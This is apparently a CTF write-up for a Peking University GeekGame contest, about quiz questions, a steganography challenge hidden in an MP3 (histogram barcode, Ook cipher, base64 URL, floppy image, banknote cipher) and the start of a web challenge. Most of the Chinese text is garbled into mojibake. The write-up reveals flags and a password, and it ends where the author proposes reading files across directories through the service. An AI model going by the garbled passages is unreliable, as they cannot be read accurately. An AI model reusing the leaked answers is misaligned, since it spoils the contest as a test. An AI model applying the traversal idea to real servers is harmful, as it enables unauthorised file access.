(OEISÂ®) æœç´¢ 3 queens å°±èƒ½æ‰¾åˆ°è¿™ä¸ª A047659 Number of ways to place 3 nonattacking queens on an n X n board. In general, for m &lt;= n, n &gt;= 3, the number of ways to place 3 nonattacking queens on an m X n board is n^3/6*(m^3 - 3*m^2 + 2*m) - n^2/2*(3*m^3 - 9*m^2 + 6*m) + n/6*(2*m^4 + 20*m^3 - 77*m^2 + 58*m) - 1/24*(39*m^4 - 82*m^3 - 36*m^2 + 88*m) + 1/16*(2*m - 4*n + 1)*(1 + (-1)^(m+1)) + 1/2*(1 + abs(n - 2*m + 3) - abs(n - 2*m + 4))*(1/24*((n - 2*m + 11)^4 - 42*(n - 2*m + 11)^3 + 656*(n - 2*m + 11)^2 - 4518*(n - 2*m + 11) + 11583) - 1/16*(4*m - 2*n - 1)*(1 + (-1)^(n+1))) [Panos Louridas, idee &amp; form 93/2007, pp. 2936-2938]. - Vaclav Kotesovec, Feb 20 2016 #6 ä¸Šä¸€å±Šï¼ˆç¬¬é›¶å±Šï¼‰æ¯”èµ›çš„â€œå°åŒ—é—®ç­”1202â€é¢˜ç›®ä¼šæŠŠæ‰€æœ‰é€‰æ‰‹æäº¤çš„ç­”æ¡ˆå­˜åˆ° SQLite æ•°æ®åº“çš„ä¸€ä¸ªè¡¨ä¸­ï¼Œè¿™ä¸ªè¡¨åå«ï¼Ÿ https://github.com/PKU-GeekGame/geekgame-0th/blob/main/src/choice/game/db.py submits #7 å›½é™…äº’è”ç½‘ç”±è®¸å¤šä¸ªè‡ªæ²»ç³»ç»Ÿï¼ˆASï¼‰ç»„æˆã€‚åŒ—äº¬å¤§å­¦æœ‰ä¸€ä¸ªè‡ªå·±çš„è‡ªæ²»ç³»ç»Ÿï¼Œå®ƒçš„ç¼–å·æ˜¯ï¼Ÿ ç­”æ¡ˆæ ¼å¼ï¼š ^AS\\d+$ https://bgp.he.net/search?search%5Bsearch%5D=Peking+University&amp;commit=Search AS59201 #8 æˆªæ­¢åˆ° 2021 å¹´ 6 æœˆ 1 æ—¥ï¼ŒåŒ—äº¬å¤§å­¦ä¿¡æ¯ç§‘å­¦æŠ€æœ¯å­¦é™¢ä¸‹å±çš„ä¸­æ–‡åç§°æœ€é•¿çš„å®éªŒå®¤å«ï¼Ÿ ç­”æ¡ˆæ ¼å¼ï¼š ^.{15,30}(å®éªŒå®¤|ä¸­å¿ƒ)$ ä¿¡æ¯ç§‘å­¦æŠ€æœ¯å­¦é™¢2022å¹´æ‹›ç”ŸæŒ‡å— åŒºåŸŸå…‰çº¤é€šä¿¡ç½‘ä¸æ–°å‹å…‰é€šä¿¡ç³»ç»Ÿå›½å®¶é‡ç‚¹å®éªŒå®¤ flag{JiU-Cong-Xian-Zai-Kai-SHi} å¶å­çš„æ–°æ­Œ â€œå¶å­åˆå‘æ–°æ­Œäº†ã€‚â€ å¶å­æ˜¯å°é›¨çš„å¥½æœ‹å‹ï¼Œæœ€è¿‘æƒ³æˆä¸ºå››è½±è¾˜çˆ±æŠ–éœ²æ‰€ä»¥æ²‰è¿·å†™æ­Œï¼Œä½†ç”±äºèµ„è´¨å¤ªè¿‡å¹³åº¸ï¼Œä»–å†™çš„æ­Œå¹¶æ²¡æœ‰ä»€ä¹ˆäººå¬ã€‚æ¯å½“ä»–åœ¨æ— äººé—®æ´¥çš„é˜´é›¨éœ‰æ¹¿ä¹‹åœ°ï¼Œå’Œç€é›¨éŸ³ï¼Œå”±ç€æ²¡æœ‰å¬ä¼—çš„æ­Œæ›²çš„æ—¶å€™ï¼Œä¹Ÿä¸ä¼šæœ‰äººå› ä¸ºä»–çš„æ­Œå£°è€Œåœ¨è·¯ä¸Šæ‹¦ä½ä»–è¯´ï¼šå¤ªå¥½æ±€äº†â‘§ï¼ ä¸è¿‡æ¯•ç«Ÿï¼Œå¶å­æ˜¯å°é›¨æœ€å¥½æœ€å¥½çš„æœ‹å‹ï¼Œå°é›¨è¿˜æ˜¯å†³å®šå¬ä¸€å¬å¶å­çš„æ–°æ­Œã€‚ä½†æ˜¯å¥¹æ€»æ„Ÿè§‰ï¼Œå¶å­ä¼¼ä¹åœ¨æ­Œé‡Œè—äº†ä¸€äº›ä¸œè¥¿ã€‚ â€œæ˜¯æƒ³å¯¹æˆ‘è¯´çš„è¯å—ï¼Ÿâ€ å°é›¨å†³å®šæ‰¾å‡ºæ­Œé‡Œè—ç€çš„ä¸‰ä¸ªFlagã€‚ å¤¢ã¯æ™‚ç©ºã‚’è¶Šãˆã¦ Secret in Album Cover!! lsb Aztec æ¡ç  https://products.aspose.app/barcode/zh-hans/recognize/aztec#/recognized Gur frperg va uvfgbtenz. ROT13 The secret in histogram. è‰ ç›´æ–¹å›¾ã€‚ã€‚ ç„¶è€Œå¤ªä¸æ¸…æ™°äº†â€¦â€¦æ²¡åŠæ³•æ€ä¹ˆéƒ½æ‰«ä¸å‡ºæ¥ã€‚ï¼ˆèµ›åæ‰çŸ¥é“å…¶å®æ˜¯åè‰²äº†ï¼‰ æœ€åä¸è¡Œè¿˜å¾—ä¸Špy from PIL import Image import binascii import cv2 import numpy as np from matplotlib import pyplot as plt image = cv2.imread(\"1.png\") colors = ('b', 'g', 'r') for n, color in enumerate(colors): hist = cv2.calcHist([image], [n], None, [256], [0, 256]) plt.plot(hist, color=color) print(hist) plt.xlim([0, 256]) plt.show() hist2 = ['1' if h[0] == 8196.0 else '0' for h in hist] hist3 = ['0' if h[0] == 8196.0 else '1' for h in hist] d2 = ''.join(hist2) d3 = ''.join(hist3) print(d3) # 1110100011000001111100010001001111100111101001000001101110001011001111110011000110001111011100010010000011001111110110011000001000111010011110001100010011000011110010000110000110011111000100100010000100111000010001011100000111001100011100111000011110010110 target = Image.new('RGBA', (300, 300), color=0) for x in range(len(d3)): for y in range(200): if d3[x] == '1': target.putpixel((x, y), (255, 255, 255, 255)) else: target.putpixel((x, y), (0, 0, 0, 255)) target.show() target.save('barcode.png') æ‰«ç å¾—åˆ° xmcp.ltd/KCwBa è®¿é—® ä½ è¿˜è®°å¾—é«˜ä¸­çš„æ—¶å€™å—ï¼Ÿé‚£æ—¶åœ¨å¸‚é‡Œçš„é‡ç‚¹ä¸­å­¦ï¼Œæˆ‘ä»¬æ˜¯åŒæ¡Œã€‚æˆ‘ä»¥å‰è¿˜æ€ªè®¨äººå«Œçš„ï¼Œè€æ˜¯æƒ¹ä½ ç”Ÿæ°”ï¼Œç„¶åä½ å°±ä¸å’Œæˆ‘è¯´è¯ï¼Œæˆ‘å°±æ­»ä¹ç™½èµ–åœ°æ±‚ä½ ï¼Œæˆ–è€…è®²ç¬‘è¯é€—ä½ ã€‚ ä¸è¿‡ï¼Œä½ ç¬‘èµ·æ¥å¥½å¯çˆ±ï¼Œä»å°å°±å¥½å¯çˆ±ã€‚æ­¤åçš„ä¸€åˆ‡ï¼Œä¹Ÿéƒ½æ˜¯ä»é‚£ä¸ªç¬‘å®¹å¼€å§‹çš„å§ã€‚ çœŸçš„ï¼Œå¥½æƒ³å›åˆ°é‚£ä¸ªæ—¶å€™å•Šã€‚ Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. å¯æ¶çš„ ook ç¼–ç ï¼Œè§£ç  å¾—åˆ°ç¬¬ä¸€ä¸ª flag flag{y0u_h4ve_f0rgott3n_7oo_much} æŠ¢äº†ä¸ªä¸€è¡€ï¼Œå¥½è€¶ï¼ å¹»å¤¢ç•Œå†çœ‹è¿™ä¸ªéŸ³é¢‘ï¼Œå‘ç°æœ‰ä¸ªå¥‡æ€ªçš„å­—ç¬¦ä¸² aHR0cDovL2xhYi5tYXh4c29mdC5uZXQvY3RmL2xlZ2FjeS50Ynoy æˆ–è€…æ ¼å¼å·¥å‚å•¥çš„çœ‹ä¸‹ä¿¡æ¯ã€‚ General Complete name : LeafsNewSong.mp3 Format : MPEG Audio File size : 4.30 MiB Duration : 58 s 70 ms Overall bit rate mode : Constant Overall bit rate : 320 kb/s Album : Secret in Album Cover!! Track name : å¶å­çš„æ–°æ­Œ Track name/Total : aHR0cDovL2xhYi5tYXh4c29mdC5uZXQvY3RmL2xlZ2FjeS50Ynoy Performer : å¶å­ Writing library : Lavf58.45.100 Cover : Yes Cover type : Cover (front) Cover MIME : image/png TSS : Logic Pro X 10.7.0 iTunNORM : 0000072C 00000736 00003208 00003140 00009E92 0000501A 00006703 00007E86 00007678 00007E1F iTunSMPB : 00000000 00000210 000007A5 00000000002709CB 00000000 002350D1 00000000 00000000 00000000 00000000 00000000 00000000 USLT : ç©ºæ— ä¸€äººçš„æˆ¿é—´ / æˆ‘æœ›å‘çª—å¤– / æƒ³å›åˆ°æ˜¨å¤© / / ç¥ç€è‰²çš„é£ / èƒ½å¦å°† å›å¿†ä¼ åˆ°é‚£è¾¹ / é—ªçƒçš„æ˜Ÿ / ç…§äº®å¤œç©º è¿æˆæˆ‘çš„æ€å¿µ / / ä½  åœ¨æ¢¦çš„å¦ä¸€è¾¹ / ç«™åœ¨ æ—¥è½çš„åœ°å¹³çº¿ / èƒŒç¦»è¿™ä¸–ç•Œè€Œå» / æƒ³ åœ¨å›ä¸å»çš„æ—¶é—´é‡Œ / é‡è§ä½  é‡è§ä½  é‡è§ä½  / é‡è§ä½  é‡è§ä½  é‡è§ä½  comment : ä½ è¿˜è®°å¾—å—ï¼Ÿå°æ—¶å€™ï¼Œæˆ‘å®¶å’Œä½ å®¶éƒ½åœ¨ä¸€ä¸ªå¤§é™¢é‡Œã€‚æ”¾å­¦ä»¥åï¼Œæˆ‘ä»¬ç»å¸¸ä¸€èµ·åœ¨é™¢å­é‡Œç©ã€‚ä½ è™½ç„¶æ˜¯ä¸ªå¥³å­©å­ï¼Œä½†æ€»æ˜¯èƒ½å’Œç”·å­©å­ä»¬ç©åˆ°ä¸€å—å»ã€‚ / / å¤å¤©çš„æ—¶å€™æˆ‘ä»¬æŒ–èš¯èš“ã€æ‰èš‚èš±ï¼›å†¬å¤©ï¼Œé™¢å­é‡Œçš„å¤§å¡ä¸Šç§¯äº†ä¸€å±‚é›ªï¼Œæˆ‘ä»¬å°±ååœ¨çº¸ç®±å­å‹æˆçš„é›ªæ©‡ä¸Šï¼Œä¸€æ¬¡æ¬¡ä»å¡é¡¶æ»‘åˆ°å¡åº•ã€‚é‚£ä¸ªæ—¶å€™ä½ è¿˜å‘ç°ï¼Œååœ¨é“ç°¸ç®•ä¸Šæ»‘å¾—æ›´å¿«ã€‚ / / â€”â€”å½“ç„¶ï¼Œé‚£æ¬¡ä½ ä¹Ÿæ‘”å¾—æŒºæƒ¨çš„ã€‚ Audio Format : MPEG Audio Format version : Version 1 Format profile : Layer 3 Format settings : Joint stereo / MS Stereo Duration : 58 s 70 ms Bit rate mode : Constant Bit rate : 320 kb/s Channel(s) : 2 channels Sampling rate : 44.1 kHz Frame rate : 38.281 FPS (1152 SPF) Compression mode : Lossy Stream size : 2.22 MiB (52%) base64 http://lab.maxxsoft.net/ctf/legacy.tbz2 ä¸‹è½½ä¸‹æ¥å†…å®¹å¦‚ä¸‹ã€‚ ï¼ˆæ€ä¹ˆæ¯”èµ›çš„æ—¶å€™å°±æ²¡æƒ³åˆ°å»å¯åŠ¨å•Šï¼Œæ ¹æœ¬æ²¡æ³¨æ„åˆ°è¿˜æœ‰å¼•å¯¼å•Š æ–°å»ºä¸€ä¸ªè™šæ‹Ÿæœºï¼Œé…ç½®è½¯é©±å¯åŠ¨ ç„¶åå°±å¯ä»¥æ‹¿åˆ° flag2 äº†ã€‚ è¿˜ç»™äº†ä¸ª final password: ItsMeMrLeaf å½“ç„¶ä¹Ÿå¯ä»¥è¯•è¯•æ‹¿ qemu å¯åŠ¨ qemu-system-x86_64 -drive format=raw,file=To_the_past.img å¤¢ã¨ç¾ã®å¢ƒç•Œå†çœ‹ img é‡Œçš„å†…å®¹ å¯†ç æ˜¯ï¼šå®¾é©­ä»¤è¯ æ€€é©­æ¦•å–†è‰ºè‰ºå®¾åºšè‰ºæ€€å–†æ™¾ä»¤å–†æ™¾æ€€ æˆ–è€…ç”¨ VMware æŠŠè½¯é©±ä»¥é•œåƒçš„æ–¹å¼æŒ‚è½½è¿›å» ç›´æ¥è¯•å‘ç°ä¸è¡Œï¼ŒæŸ¥äº†ä¸€ä¸‹å‘ç°æ˜¯çº¸å¸ç®±å·çš„æš—è¯­ï¼ˆï¼Ÿ è§£é‡Šç®±å·åˆ†äºŒæ­¥ï¼Œç¬¬ä¸€æ­¥æ˜¯æŠŠæš—ç è½¬æˆæ˜ç ï¼Œç¬¬äºŒæ­¥æ˜¯æŒ‰æ˜ç è¿›è¡ŒæŸ¥è§£ï¼Œå¾—åˆ°ä½ è¦çš„æ•°æ®ã€‚ ç¬¬äº”å¥—äººæ°‘å¸ï¼š ä¾‹ï¼š06 ç‘é©­å–†è¯  329606ï¼šä»£è¡¨æ˜¯2006å¹´ç”Ÿäº§çš„æ­¤å·ï¼›ç‘ï¼šä»£è¡¨é¢å€¼ï¼Œæ˜¯ä¸€ä¸ªå¸¦æ ½ç‹æ—çš„å­—ï¼Œç‘æ˜¯ä¸€å…ƒï¼Œç®æ˜¯åå…ƒï¼Œå¥‡è°ˆçš„æˆ‘æ²¡è§è¿‡ã€‚é©­å–†è¯ ï¼šè¿™æ˜¯ä¸€ä¸ªæš—è¯­ï¼Œç¿»è¯‘æ˜¯è‰º=1 é©­=2 ä»¤=3 æ€€=4 åºš=5 è¯ =6 å®¾=7 æ™¾=8 å–†=9 æ¦•=10ä¹Ÿå°±æ˜¯0é©­å–†è¯ å°±æ˜¯296å·æ€€å®¾å°±æ˜¯47å·ã€‚3296ï¼šé’±å¸çš„æµæ°´å·ã€‚ https://zhidao.baidu.com/question/400192266.html é¡ºä¾¿ï¼Œç¬¬å››å¥—ï¼š ä¾‹ï¼š00ä½æ‰“æ‰æ‹‰ 1348 00ï¼šä»£è¡¨æ˜¯2000å¹´ç”Ÿäº§çš„æ­¤å·ï¼› ä½ï¼šä»£è¡¨é¢å€¼ï¼Œæ˜¯ä¸€ä¸ªå¸¦å•äººæ—çš„å­—ï¼Œä»˜æ˜¯ä¸€è§’ï¼Œä½æ˜¯äºŒè§’ï¼Œä¿¡æ˜¯äº”è§’ï¼Œä»æ˜¯ä¸€å…ƒï¼Œä¼™æ˜¯äºŒå…ƒï¼Œä½³å£«äº”å…ƒï¼Œå¤§é¢å€¼çš„æˆ‘æ²¡è§è¿‡ï¼Œä¹Ÿç”¨ä¸åˆ°å§ã€‚ æ‰“æ‰æ‹‰ï¼šè¿™æ˜¯å‡ ä¸ªç”±ææ‰‹æ—ç»„æˆçš„ï¼Œæ˜¯ä¸€ä¸ªæš—è¯­ï¼Œç¿»è¯‘æ˜¯ æ‰-1 æ‰“-2 æ‰›-3 æŠ–-4 æ‹‰-5 æŒ-6 æ-7 æ¥-8 æ–-9 æ-10ä¹Ÿå°±æ˜¯0 é‚£ä¹ˆæ‰“æ‰æ‹‰å°±æ˜¯215 å†å¦‚æŒæ‰“æå°±æ˜¯620 æ‰å°±æ˜¯1å· 1348ï¼šé’±å¸çš„æµæ°´å·ã€‚ æ‰€ä»¥ä¸Šé¢çš„å­—ç¿»è¯‘æˆæ˜è¯­å°±æ˜¯2000å¹´äºŒè§’215å·ï¼Œæµæ°´å·1348 ä¸‰ç‰ˆä¹Ÿä¸€æ ·ï¼Œä¾‹ï¼š98å…¬å¼•ä¹˜å¾˜æŒ¯ 0867 98ï¼šä»£è¡¨æ˜¯1998å¹´ç”Ÿäº§çš„æ­¤å·ï¼› å…¬ï¼šä»£è¡¨é¢å€¼ï¼Œå…¬å¼ä¸€åˆ†ï¼Œå…¶ä»–çš„çš„æˆ‘æ²¡è§è¿‡ã€‚ å¼•ä¹˜å¾˜æŒ¯ï¼šè¿™æ˜¯ä¸€ä¸ªæš—è¯­ï¼Œç¿»è¯‘æ˜¯ å¼•-1 ä»€-2 å£®-3 æ‰¶-4 ä½œ-5 ç¥¥-6 æŒ¯-7 å¾˜-8 æ¹ƒ-9 ä¹˜-10ä¹Ÿå°±æ˜¯0 å¼•ä¹˜å¾˜æŒ¯å°±æ˜¯1087å· å¼•å¼•ä½œå°±æ˜¯115å· 0867ï¼šé’±å¸çš„æµæ°´å·ã€‚ d = dict(è‰º=1,é©­=2,ä»¤=3,æ€€=4,åºš=5,è¯ =6,å®¾=7,æ™¾=8,å–†=9,æ¦•=0) s = \"å®¾é©­ä»¤è¯ æ€€é©­æ¦•å–†è‰ºè‰ºå®¾åºšè‰ºæ€€å–†æ™¾ä»¤å–†æ™¾æ€€\" for i in s: print(d[i], end=\"\") å¾—åˆ° 72364209117514983984ï¼Œè§£å‹ã€‚ çº¢ç™½æœºå•Šã€‚ã€‚ä¸‹äº†ä¸ª FCEUX.EXE æ¨¡æ‹Ÿå™¨ï¼Œåˆæ‰¾äº†ä¸ªç»å…¸çº¢ç™½æœºçš„æ¸¸æˆåˆé›† ã€çº¢ç™½æœºå®Œå…¨æ¡£æ¡ˆã€‘å…¨çº¢ç™½æœºFCæ¸¸æˆåˆé›†ï¼ˆä¸‰ï¼‰ ï¼Œå‘ç°æ¨¡æ‹Ÿçš„æ–‡ä»¶æ˜¯ .nesï¼Œè¿™ä¸ªä¸å¯¹å•Šâ€¦â€¦ å†çœ‹ readmeï¼Œæ‰¾ä¸åŒã€‚ã€‚ left/right å¯¹æ¯” å†éšä¾¿çœ‹ä¸ª .nes çš„æ–‡ä»¶ 4E45531Aï¼Œè‰ï¼Œå°±æ˜¯æŠŠå·®å¼‚çš„éƒ¨åˆ†æå–å‡ºæ¥å˜›ã€‚ æƒ³äº†åŠå¤©ä¸çŸ¥é“æ€ä¹ˆ diff å¯¼å‡ºåˆ°æ–‡ä»¶æ¯”è¾ƒå¥½ã€‚æœ€åå…ˆæ‹¿ 010 editor åšäº†ä¸ª diffï¼Œå¯¼å‡ºåˆ° csvï¼Œç„¶åå†™äº†ä¸ªè„šæœ¬æå–å·¦å³å·®å¼‚çš„éƒ¨åˆ†ï¼Œå¯¼å‡ºåˆ° bin æ–‡ä»¶ã€‚ æœ€åå†æ‹¿ fceux æ¨¡æ‹Ÿå™¨è·‘ä¸€è·‘ï¼Œç„¶è€Œä¸çŸ¥é“ä¸ºå•¥æˆ‘å¯¼å‡ºæ¥çš„ binary æ–‡ä»¶è·‘ä¸èµ·æ¥ï¼Œç•Œé¢ä¸€ç‰‡ç°ã€‚ä¼°è®¡å“ªé‡Œ diff é”…äº†å§ï¼ˆï¼Ÿ åé¢å†æ¥å¤ç°ï¼ˆå’• Flagå³æœåŠ¡ You é…±å¬è¯´æœ€è¿‘ *aaS æ¦‚å¿µååˆ†ç«çƒ­ï¼Œæ— è®ºä»€ä¹ˆéƒ½å¯ä»¥åšæˆå¼€æ”¾çš„ APIï¼Œå°±åƒè¿æ¥ç€æ¯ä¸ªè®¾å¤‡çš„ä¸€æ¡åˆ†å¸ƒå¼è½¯æ€»çº¿ï¼Œå¯ä»¥è·¨è¶Šç¼–ç¨‹è¯­è¨€å’Œæ“ä½œç³»ç»Ÿçš„é™åˆ¶ï¼Œå®ç°ä»»ä½•æƒ³åšçš„åŠŸèƒ½ã€‚æœ‰äº† *aaSï¼Œæˆ‘ä»¬å°±ç¦»å…ƒå®‡å®™æ›´è¿‘ä¸€æ­¥äº†å‘¢ã€‚ å—æ­¤é¼“èˆï¼ŒYoué…±ç”¨ä¸€å¤©æ—¶é—´å¼€å‘å‡ºäº†éœ‡æ’¼äººå¿ƒçš„æ–°é¡¹ç›® JSON-as-a-Serviceï¼Œè¦è§£å†³å›°æ‰°å…¨ä¸–ç•Œå¼€å‘è€…å‡ åå¹´çš„ JSON æ ¼å¼è½¬æ¢éš¾é¢˜ã€‚ å¥¹åœ¨è‡ªå·±ä¿å­˜ Flag çš„æœåŠ¡å™¨ä¸Šéƒ¨ç½²äº†è¿™ä¸ªæœåŠ¡ï¼Œå¹¶å‘ç»™ä½ äº†ä¸€ä¸ªé“¾æ¥ï¼Œæƒ³è¯·ä½ ä½“éªŒä¸€ä¸‹ã€‚ é›¶Â·è·å¾—ä»£ç  è¿™é‡Œçš„ dockerfile æç¤ºäº†æˆ‘ä»¬è¿™ä¸ªæä¾›çš„æ–‡ä»¶åœ¨ data ç›®å½•ä¸‹ FROM node:14 WORKDIR /usr/src/app COPY path/to/server_source_code . COPY path/to/demo.json data/ RUN npm install EXPOSE 3001 CMD [ \"npm\", \"start\" ] é‚£è¯•è¯•èƒ½ä¸èƒ½è·¨ç›®å½•è¯»å–å‘¢ï¼Ÿ nodejsï¼Œé‚£å°±è¯»ä¸‹ package.json {\"name\":\"demo-server\",\"version\":\"1.0.0\",\"description\":\"\",\"scripts\":{\"start\":\"node --max-http-header-size=32768 